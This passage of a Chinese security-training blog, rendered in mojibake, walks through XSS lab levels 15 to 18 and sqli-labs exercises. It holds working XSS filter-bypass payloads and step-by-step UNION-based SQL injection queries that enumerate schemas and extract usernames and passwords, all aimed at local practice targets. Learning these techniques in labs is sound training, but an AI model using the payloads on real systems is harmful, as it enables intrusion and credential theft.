FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>HTML <code>&lt;iframe&gt;</code> æ ‡ç­¾ï¼šä½œç”¨æ˜¯æ ‡è®°ä¸€ä¸ªå†…è”æ¡†æ¶ï¼ï¼ä¸€ä¸ªå†…è”æ¡†æ¶è¢«ç”¨æ¥åœ¨å½“å‰ HTML æ–‡æ¡£ä¸­åµŒå…¥å¦ä¸€ä¸ªæ–‡æ¡£ã€‚</p><h4 id="level15-ng-include"><a href="#level15-ng-include" class="headerlink" title="level15_ng-include"></a>level15_ng-include</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001826.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001160.png"></p><p><code>ng-include</code> æ˜¯ AngularJS ä¸­çš„ä¸€ä¸ªæŒ‡ä»¤ï¼Œç”¨äºåœ¨ HTML ä¸­åŠ¨æ€åŠ è½½å¹¶åµŒå…¥å¤–éƒ¨çš„ HTML ç‰‡æ®µã€‚å®ƒå…è®¸ä½ å°†ä¸€ä¸ªå¤–éƒ¨çš„ HTML æ–‡ä»¶æˆ–æ¨¡æ¿åŒ…å«åˆ°å½“å‰çš„é¡µé¢ä¸­ï¼Œä»è€Œå®ç°æ¨¡å—åŒ–å’Œä»£ç å¤ç”¨ã€‚</p><p>åŒ…å«ç¬¬ä¸€å…³</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001686.png"></p><p>è¿›è¡Œäº†å®ä½“è½¬ä¹‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001859.png"></p><p>æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?src=&#x27;level1.php?name=&lt;img src=XXX onmouseover=alert()&gt;&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001888.png"></p><h4 id="level16-ç©ºæ ¼å®ä½“è½¬ä¹‰"><a href="#level16-ç©ºæ ¼å®ä½“è½¬ä¹‰" class="headerlink" title="level16_ç©ºæ ¼å®ä½“è½¬ä¹‰"></a>level16_ç©ºæ ¼å®ä½“è½¬ä¹‰</h4><p>æµ‹è¯•ä¸€ä¸‹å…³é”®å­—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?keyword=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P&lt;/&gt; &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001496.png"></p><p>å°†å­—æ¯å°å†™åŒ–ï¼Œå†æŠŠscriptå’Œ&#x2F;æ›¿æ¢æˆç©ºæ ¼ï¼Œæœ€åå°†ç©ºæ ¼ç»™å®ä½“åŒ–</p><p>ç©ºæ ¼å¯ä»¥ç”¨å›è½¦æ¥ä»£æ›¿ç»•è¿‡ï¼Œå›è½¦çš„urlç¼–ç æ˜¯<code>%0a</code>ï¼Œå†é…åˆä¸Šä¸ç”¨ &#x2F; çš„<code>&lt;img&gt;</code>ã€<code>&lt;details&gt;</code>ã€<code>&lt;svg&gt;</code>ç­‰æ ‡ç­¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?keyword=&lt;svg%0Aonload=alert()&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002288.png"></p><h4 id="level17-embed"><a href="#level17-embed" class="headerlink" title="level17_embed"></a>level17_embed</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002425.png"></p><p><code>embed</code> æ˜¯ HTML ä¸­çš„ä¸€ä¸ªæ ‡ç­¾ï¼Œç”¨äºåœ¨ç½‘é¡µä¸­åµŒå…¥å¤–éƒ¨å†…å®¹ï¼Œä¾‹å¦‚ PDF æ–‡ä»¶ã€è§†é¢‘ã€éŸ³é¢‘ã€Flash åŠ¨ç”»ç­‰ã€‚</p><p>embedå°†ä¸€ä¸ªswfæ–‡ä»¶å¼•åˆ°æµè§ˆå™¨ç«¯</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?arg01= onmouseover&amp;arg02=alert(1)<br></code></pre></td></tr></table></figure><p><code>onmouseover</code>ï¼šè¡¨ç¤ºå½“é¼ æ ‡ç§»åŠ¨åˆ°è¯¥æ ‡ç­¾ä¸Šæ—¶å°±ä¼šè§¦å‘æ‰§è¡ŒæŸé¡¹åŠ¨ä½œ</p><p>ç«ç‹ä¸å¯ä»¥ï¼Œedgeå¯ä»¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002531.png"></p><h4 id="level18-embed"><a href="#level18-embed" class="headerlink" title="level18_embed"></a>level18_embed</h4><p>ä¸level17ä¸€æ ·ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002007.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022002406.png"></p><h1 id="3ã€sqli-labs"><a href="#3ã€sqli-labs" class="headerlink" title="3ã€sqli-labs"></a>3ã€sqli-labs</h1><h2 id="sqlæ³¨å…¥ä¸€èˆ¬æ­¥éª¤ï¼š"><a href="#sqlæ³¨å…¥ä¸€èˆ¬æ­¥éª¤ï¼š" class="headerlink" title="sqlæ³¨å…¥ä¸€èˆ¬æ­¥éª¤ï¼š"></a><strong>sqlæ³¨å…¥ä¸€èˆ¬æ­¥éª¤ï¼š</strong></h2><p><strong>ä¸€ã€åˆ¤æ–­æ³¨å…¥ç±»å‹</strong></p><p><strong>æ•°å­—å‹æ³¨å…¥</strong></p><ol><li>urlä¸º<code> http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;</code>æ—¶ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªå¤šä½™çš„â€å•å¼•å·â€ä½¿æŸ¥è¯¢è¯­å¥é”™è¯¯</li><li>urlä¸º <code>http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1</code>æ—¶ï¼Œæ²¡æœ‰æŠ¥é”™</li><li>urlä¸º<code> http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2</code>æ—¶ï¼Œç”±äº1&#x3D;2ä¸æˆç«‹ï¼Œä¹Ÿä¼šæŠ¥é”™</li></ol><p>æ»¡è¶³è¿™ä¸‰ä¸ªï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯æ•°å­—æ³¨å…¥äº†</p><p><strong>å­—ç¬¦å‹æ³¨å…¥</strong></p><ol><li>urlä¸º <code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;</code>æ—¶ï¼Œæ•°æ®åº“è®¤ä¸ºidå«åš1â€™ã€‚æŸ¥è¯¢ä¹‹åå‘ç°æ²¡æœ‰è¿™ä¸ªidè€Œè¿”å›é”™è¯¯ã€‚ï¼ˆåœ¨å­—ç¬¦å‹æ³¨å…¥ä¸­ï¼Œéœ€è¦è€ƒè™‘å¼•å·çš„é—­åˆï¼‰</li><li>urlä¸º <code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; and &#39;1&#39;=&#39;1 </code>åœ¨â€™1â€™&#x3D;â€™1ä¹‹åæ²¡æœ‰åŠ ä¸Šâ€™æ˜¯å› ä¸ºä¼ å‚æ—¶è¾“å…¥çš„å†…å®¹å·²ç»è¢«â€™ â€˜åŒ…å›´ã€‚</li></ol><p>æ»¡è¶³è¿™ä¿©ä¸ªï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯å­—ç¬¦æ³¨å…¥äº†</p><p><strong>äºŒã€åå°æŸ¥è¯¢åˆ—æ•°</strong></p><p>ä½¿ç”¨<code>order by</code>è¯•å‡ºæ•°æ®åº“åˆ—æ•°</p><p>urlä¸º <code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; order by æ•°å­— </code>ï¼ˆå¦‚æœè¯•4æ—¶æœ‰é”™è¯¯ï¼Œ3æ—¶æ­£ç¡®ï¼Œé‚£ä¹ˆåˆ—æ•°ä¸º3ï¼‰</p><p><strong>ä¸‰ã€æ‰¾æ˜¾ç¤ºä½</strong></p><p>ä½¿ç”¨<code>union select</code>æ‰¾å‡ºä¼šè¿”å›å®¢æˆ·ç«¯å¹¶æ˜¾ç¤ºçš„åˆ—ã€‚å¦‚æœæœ‰3åˆ—æ—¶ï¼Œåº”è¯¥è¿™ä¹ˆå†™</p><p>urlä¸º<code> http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,2,3</code></p><p>åŠ å…¥æ˜¾ç¤ºä½æ˜¯3ï¼Œè¿™å°±æ„å‘³ç€æ•°æ®åº“å¼€æ”¾äº†5ä¸ªâ€œçª—å£â€ç”¨æ¥æ˜¾ç¤ºå†…å®¹ï¼Œç”¨æŸ¥è¯¢åˆ°çš„æ•°æ®ï¼Œåœ¨è¿™äº›çª—å£æ˜¾ç¤ºæ•°æ®</p><p><strong>å››ã€æŸ¥åº“åï¼Œè·å–å½“å‰æ•°æ®åå’Œç‰ˆæœ¬å·</strong></p><p>è”åˆæŸ¥è¯¢ï¼š<code>select database();</code></p><p>ä¸‹é¢æ˜¯æŸ¥çœ‹æ•°æ®åº“çš„ç‰ˆæœ¬å’Œæ•°æ®åº“ä¿¡æ¯</p><p>å‡å¦‚æ˜¾ç¤ºä½æ˜¯3ï¼Œ<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,version,database()</code></p><p><strong>äº”ã€æŸ¥è¡¨å</strong></p><p>æ‰¾åˆ°åº“åä»¥åï¼Œä½¿ç”¨<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,2,table_name from information_schema.tables where table_schema=&#39;åº“å&#39; </code>(å¦‚æœåº“åæ˜¯å­—ç¬¦å‹ï¼Œæ­¤å¤„åº“åè¦è½¬æˆåå…­è¿›åˆ¶)</p><p><strong>information_schema:</strong></p><p>è¿™æ˜¯ä¸€ä¸ªmysqlè‡ªå¸¦çš„åº“ï¼Œå…¶ä¸­ä¿å­˜ç€å…³äºmysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨åˆ—çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥è¯¢è¿™ä¸ªåº“</p><p><strong>å…­ã€æŸ¥åˆ—å</strong></p><p>æ‰¾åˆ°è¡¨ä¹‹åï¼Œä½¿ç”¨<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;è¡¨å&#39; </code>(å¦‚æœè¡¨åæ˜¯å­—ç¬¦å‹ï¼Œæ­¤å¤„åº“åè¦è½¬æˆåå…­è¿›åˆ¶)</p><p>å¦‚æœè¡¨æ•°æˆ–åˆ—æ•°è¿‡å¤šï¼Œå¯ä»¥åœ¨æœ€åä½¿ç”¨limitåŠ ä¸Šlimit 0ï¼Œ5ç›¸å½“äºæ£€ç´¢1-5æ¡ä¿¡æ¯</p><p><strong>ä¸ƒã€æŸ¥å…·ä½“æ•°æ®</strong></p><p>æ‰¾åˆ°åˆ—ä¹‹åï¼Œä½¿ç”¨<code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39; union select 1,2,group_concat(&quot;è¦æŸ¥è¯¢çš„æ•°æ®&quot;) from åˆ—å</code></p><p>æ€»ç»“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1<br>?id=1&#x27;//å‡ºé”™<br>?id=1 and 1=1//æ­£å¸¸<br>?id=1 and 1=2//å‡ºé”™      //æ£€æŸ¥ä¸ºæ•°å­—æ³¨å…¥<br> <br>?id=1&#x27; and &#x27;1&#x27;=&#x27;1//æ­£å¸¸<br>?id=1&#x27;//å‡ºé”™//æ£€æŸ¥ä¸ºå­—ç¬¦æ³¨å…¥<br> <br>?id=1 order by 3//æŸ¥åˆ—æ•°<br>?id=-1 union select 1,2,3//æ‰¾æ˜¾ç¤ºä½<br>?id=-1 union select 1,database(),version()//æŸ¥åº“åï¼Œè·å–å½“å‰æ•°æ®åå’Œç‰ˆæœ¬å·<br>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;åº“å&#x27;//æŸ¥è¡¨å<br>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;è¡¨å&#x27;//æŸ¥åˆ—å<br>?id=-1 union select 1,2,group_concat(username ,id , password) from åˆ—å//æŸ¥å­—æ®µ<br> <br></code></pre></td></tr></table></figure><h2 id="ä»¥ä¸‹æ˜¯-SQL-æ³¨å…¥æ”»å‡»çš„ä¸€èˆ¬æ­¥éª¤æ€»ç»“"><a href="#ä»¥ä¸‹æ˜¯-SQL-æ³¨å…¥æ”»å‡»çš„ä¸€èˆ¬æ­¥éª¤æ€»ç»“" class="headerlink" title="ä»¥ä¸‹æ˜¯ SQL æ³¨å…¥æ”»å‡»çš„ä¸€èˆ¬æ­¥éª¤æ€»ç»“"></a>ä»¥ä¸‹æ˜¯ SQL æ³¨å…¥æ”»å‡»çš„ä¸€èˆ¬æ­¥éª¤æ€»ç»“</h2><hr><p><strong>1. æ¢æµ‹æ³¨å…¥ç‚¹</strong></p><ul><li><strong>ç›®æ ‡</strong>ï¼šå¯»æ‰¾å¯èƒ½å­˜åœ¨æ¼æ´çš„è¾“å…¥å‚æ•°ï¼ˆå¦‚ URL å‚æ•°ã€è¡¨å•å­—æ®µã€Cookie ç­‰ï¼‰ã€‚</li><li><strong>æ–¹æ³•</strong>ï¼š  <ul><li>åœ¨å‚æ•°åæ·»åŠ å•å¼•å· <code>&#39;</code>ï¼Œè§‚å¯Ÿæ˜¯å¦è¿”å›æ•°æ®åº“é”™è¯¯ï¼ˆå¦‚ <code>You have an error in your SQL syntax</code>ï¼‰ã€‚  </li><li>ä½¿ç”¨é€»è¾‘æµ‹è¯•ï¼š</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>  <span class="hljs-comment">-- æ­£å¸¸è¿”å›  </span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span>  <span class="hljs-comment">-- æ— è¿”å›ï¼ˆè¯´æ˜æ¡ä»¶ç”Ÿæ•ˆï¼Œå­˜åœ¨æ³¨å…¥ï¼‰</span><br></code></pre></td></tr></table></figure><hr><p><strong>2. åˆ¤æ–­æ³¨å…¥ç±»å‹</strong></p><ul><li><strong>åŸºäºé”™è¯¯ï¼ˆError-Basedï¼‰</strong>ï¼šç›´æ¥é€šè¿‡æŠ¥é”™ä¿¡æ¯è·å–æ•°æ®ï¼ˆå¦‚ <code>extractvalue(1, concat(0x7e, version()))</code>ï¼‰ã€‚  </li><li><strong>è”åˆæŸ¥è¯¢ï¼ˆUNION-Basedï¼‰</strong>ï¼šåˆ©ç”¨ <code>UNION SELECT</code> å›æ˜¾æ•°æ®ã€‚  </li><li><strong>å¸ƒå°”ç›²æ³¨ï¼ˆBoolean Blindï¼‰</strong>ï¼šé€šè¿‡é¡µé¢è¿”å›çœŸå‡çŠ¶æ€æ¨æ–­æ•°æ®ï¼ˆå¦‚ <code>AND 1=1</code> &#x2F; <code>AND 1=2</code>ï¼‰ã€‚  </li><li><strong>æ—¶é—´ç›²æ³¨ï¼ˆTime-Basedï¼‰</strong>ï¼šé€šè¿‡å»¶æ—¶å‡½æ•°åˆ¤æ–­æ¡ä»¶ï¼ˆå¦‚ <code>SLEEP(5)</code>ï¼‰ã€‚</li></ul><hr><p><strong>3. ç¡®å®šå­—æ®µæ•°</strong></p><ul><li><strong>æ–¹æ³•</strong>ï¼šä½¿ç”¨ <code>ORDER BY</code> é€’å¢æµ‹è¯•ï¼Œç›´åˆ°æŠ¥é”™ï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; ORDER BY 3 --+  -- æ­£å¸¸  </span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+  -- æŠ¥é”™ï¼ˆå­—æ®µæ•°ä¸º3ï¼‰</span><br></code></pre></td></tr></table></figure><ul><li><strong>ç›®çš„</strong>ï¼šä¸ºåç»­ <code>UNION SELECT</code> åŒ¹é…åˆ—æ•°ã€‚</li></ul><hr><p><strong>4. è”åˆæŸ¥è¯¢æå–æ•°æ®</strong></p><ul><li><strong>æ­¥éª¤</strong>ï¼š  <ol><li>å¼ºåˆ¶åŸæŸ¥è¯¢è¿”å›ç©ºï¼š<code>id=-1&#39; UNION SELECT 1,2,3 --+</code>ã€‚  </li><li>è§‚å¯Ÿé¡µé¢å›æ˜¾ä½ç½®ï¼ˆå¦‚æ˜¾ç¤ºæ•°å­— <code>2</code> æˆ– <code>3</code>ï¼‰ã€‚  </li><li>æ›¿æ¢ä¸ºæ•æ„Ÿå‡½æ•°ï¼š</li></ol></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT 1,database(),version() --+  </span><br><span class="hljs-string">-- å›æ˜¾æ•°æ®åº“åå’Œç‰ˆæœ¬</span><br></code></pre></td></tr></table></figure><hr><p><strong>5. æå–æ•°æ®åº“ä¿¡æ¯</strong></p><ul><li><strong>æ ¸å¿ƒè¡¨</strong>ï¼šé€šè¿‡ <code>information_schema</code> è·å–å…ƒæ•°æ®ï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- è·å–æ‰€æœ‰è¡¨å</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br><span class="hljs-comment">-- è·å–æŸè¡¨çš„åˆ—åï¼ˆå‡è®¾è¡¨åä¸ºusersï¼‰</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br><br><span class="hljs-comment">-- æå–æ•°æ®ï¼ˆå‡è®¾åˆ—åä¸ºusername,passwordï¼‰</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-string">&#x27;:&#x27;</span>,password),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="é¶åœºç»ƒä¹ -2"><a href="#é¶åœºç»ƒä¹ -2" class="headerlink" title="é¶åœºç»ƒä¹ "></a>é¶åœºç»ƒä¹ </h2><h4 id="Less-1-å•å¼•å·-å­—ç¬¦å‹"><a href="#Less-1-å•å¼•å·-å­—ç¬¦å‹" class="headerlink" title="Less-1-å•å¼•å·_å­—ç¬¦å‹"></a>Less-1-å•å¼•å·_å­—ç¬¦å‹</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004608.png"></p><p>æç¤ºä½ è¾“å…¥æ•°å­—å€¼çš„IDä½œä¸ºå‚æ•°</p><p>**1.**è¾“å…¥<code>?id=1</code>,æ•°å­—ä¸åŒï¼Œæ˜¾ç¤ºä¸åŒ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004879.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004485.png"></p><p>è¿™é‡Œè¿›å…¥åˆ°æ•°æ®åº“é‡Œé¢æŸ¥è¯¢</p><p>**2.**æ¥ä¸‹æ¥æˆ‘ä»¬åˆ¤æ–­sqlè¯­å¥æ˜¯å¦æ˜¯æ‹¼æ¥ï¼Œæ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004952.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022004988.png"></p><p><strong>3.<strong>å¯ä»¥æ ¹æ®ç»“æœæŒ‡å®šæ˜¯</strong>å­—ç¬¦å‹</strong>ä¸”å­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚å› ä¸ºè¯¥é¡µé¢å­˜åœ¨å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢ã€‚</p><p>è”åˆæŸ¥è¯¢åŸç†ï¼šè”åˆæŸ¥è¯¢å°±æ˜¯ä¸¤ä¸ªsqlè¯­å¥ä¸€èµ·æŸ¥è¯¢ï¼Œä¸¤å¼ è¡¨å…·æœ‰ç›¸åŒçš„åˆ—æ•°ï¼Œä¸”å­—æ®µåæ˜¯ä¸€æ ·çš„ã€‚</p><hr><h5 id="å…³äºå­—ç¬¦å‹æ³¨å…¥ï¼š"><a href="#å…³äºå­—ç¬¦å‹æ³¨å…¥ï¼š" class="headerlink" title="å…³äºå­—ç¬¦å‹æ³¨å…¥ï¼š"></a>å…³äºå­—ç¬¦å‹æ³¨å…¥ï¼š</h5><hr><ol><li><strong>Less-1 çš„ SQL è¯­å¥ç»“æ„</strong></li></ol><p>å‡è®¾åç«¯ä»£ç é€»è¾‘å¦‚ä¸‹ï¼ˆå­—ç¬¦å‹æ³¨å…¥ï¼‰ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$id&#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><ul><li><code>$id</code> æ˜¯ç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œç”¨å•å¼•å· <code>&#39;</code> åŒ…è£¹ã€‚</li><li>æ³¨å…¥çš„ç›®æ ‡æ˜¯<strong>é—­åˆå•å¼•å·</strong>å¹¶æ’å…¥æ¶æ„ä»£ç ï¼Œå†ç”¨æ³¨é‡Šç¬¦ <code>--+</code> å¿½ç•¥åç»­å†…å®¹ã€‚</li></ul><hr><ol start="2"><li><strong>ä¸¤ç§è¾“å…¥å¯¹æ¯”åˆ†æ</strong></li></ol><p><strong>åœºæ™¯ 1ï¼š</strong><code>?id=1 order by 3 --+</code></p><p>ç”Ÿæˆçš„ SQL è¯­å¥ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1 order by 3 -- &#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><ul><li><strong>é—®é¢˜</strong>ï¼š<ul><li>è¾“å…¥å€¼ <code>1 order by 3 --+</code> è¢«åŒ…è£¹åœ¨å•å¼•å·å†…ï¼Œæ•´ä½“è§†ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</li><li><code>order by 3</code> æ˜¯å­—ç¬¦ä¸²å†…å®¹ï¼Œè€Œé SQL è¯­æ³•ã€‚</li><li>å®é™…æ‰§è¡Œçš„è¯­å¥ç­‰ä»·äºï¼š</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1 order by 3 &#x27;</span> LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><pre><code class="hljs">- æ•°æ®åº“ä¼šå°è¯•æŸ¥æ‰¾ `id` å€¼ä¸º `1 order by 3` çš„è®°å½•ï¼ˆè§†ä¸ºå­—ç¬¦ä¸²ï¼‰ï¼Œä½†è¡¨ä¸­æ— æ­¤æ•°æ®ï¼Œå¯¼è‡´æ— å›æ˜¾ã€‚</code></pre><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005086.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005688.png"></p><p><strong>åœºæ™¯ 2ï¼š</strong><code>?id=1&#39; order by 3 --+</code></p><p>ç”Ÿæˆçš„ SQL è¯­å¥ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">-- &#x27; LIMIT 0,1;</span><br></code></pre></td></tr></table></figure><ul><li><strong>å…³é”®ç‚¹</strong>ï¼š<ul><li>å•å¼•å· <code>&#39;</code> ç”¨äºé—­åˆåŸå§‹ SQL ä¸­çš„ <code>id=&#39;...&#39;</code>ã€‚</li><li><code>order by 3</code> è¢«æˆåŠŸæ³¨å…¥åˆ° SQL è¯­å¥ä¸­ï¼Œæˆä¸ºæœ‰æ•ˆè¯­æ³•ã€‚</li><li>æ³¨é‡Šç¬¦ <code>--+</code> å¿½ç•¥åç»­çš„ <code>&#39; LIMIT 0,1</code>ï¼Œæœ€ç»ˆæ‰§è¡Œï¼š</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><pre><code class="hljs">- æ­¤è¯­å¥åˆæ³•ï¼Œä¼šæŒ‰ç¬¬ä¸‰åˆ—æ’åºå¹¶è¿”å›æ•°æ®ï¼Œé¡µé¢æ­£å¸¸å›æ˜¾ã€‚</code></pre><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022005300.png"></p><hr><ol start="3"><li><strong>å­—ç¬¦å‹æ³¨å…¥ &amp; æ•°å­—å‹æ³¨å…¥</strong></li></ol><ul><li><strong>å­—ç¬¦å‹æ³¨å…¥</strong>ï¼ˆå¦‚ Less-1ï¼‰ï¼š<ul><li>å‚æ•°è¢«å•å¼•å·åŒ…è£¹ï¼ˆ<code>id=&#39;$id&#39;</code>ï¼‰ã€‚</li><li><strong>å¿…é¡»é—­åˆå•å¼•å·</strong>æ‰èƒ½æ³¨å…¥ä»£ç ï¼Œä¾‹å¦‚ <code>1&#39; [payload] 